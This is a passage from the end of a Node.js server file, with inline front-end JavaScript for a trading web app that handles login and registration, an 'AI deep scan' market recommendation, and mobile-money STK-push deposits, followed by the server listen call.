      document.getElementById('authToggleBtn').innerText = authMode === 'REGISTER' ? 'Already have an account? Login' : 'Need an account? Register';
      
      if (authMode === 'REGISTER') document.getElementById('mobileWrapper').classList.remove('hidden');
      else document.getElementById('mobileWrapper').classList.add('hidden');
    }

    async function submitAuth() {
      const email = document.getElementById('authEmail').value.trim();
      const password = document.getElementById('authPassword').value.trim();
      const mobileNumber = document.getElementById('authMobile').value.trim();

      if (!email || !password) return alert("Please enter required credentials.");
      if (authMode === 'REGISTER' && !mobileNumber) return alert("Mobile number is required for registration.");

      const endpoint = authMode === 'REGISTER' ? '/api/auth/register' : '/api/auth/login';
      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, mobileNumber })
      });

      const data = await res.json();
      if (data.error) return alert(data.error);

      currentUser = data.user;
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'IDENTIFY', userId: currentUser.id }));
      }
      updateBalanceDisplay();
      document.getElementById('authModal').classList.add('hidden');
    }

    async function runAiScan() {
      const res = await fetch('/api/ai/deep-scan');
      const data = await res.json();
      if (data.success) {
        const m = data.bestMarket;
        alert(\`AI Deep Scan Complete!\nBest Market: \${m.name}\nRecommendation: \${m.targetMarket} (\${m.recommendedType})\nConfidence: \${m.score}%\`);
      }
    }

    function openDepositModal() {
      if (!currentUser) return alert("Please log in first.");
      document.getElementById('depositMobileDisplay').value = currentUser.mobileNumber;
      document.getElementById('depositModal').classList.remove('hidden');
    }

    function closeDepositModal() { document.getElementById('depositModal').classList.add('hidden'); }

    async function processStkDeposit() {
      const amount = document.getElementById('depositAmount').value;
      const res = await fetch('/api/wallet/deposit/stkpush', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUser.id, amount })
      });

      const data = await res.json();
      if (data.error) return alert(data.error);

      currentUser.realBalance = data.realBalance;
      setAccountType('REAL');
      alert(data.message);
      closeDepositModal();
    }

    updateTradeForm();
  </script>
</body>
</html>
  `);
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
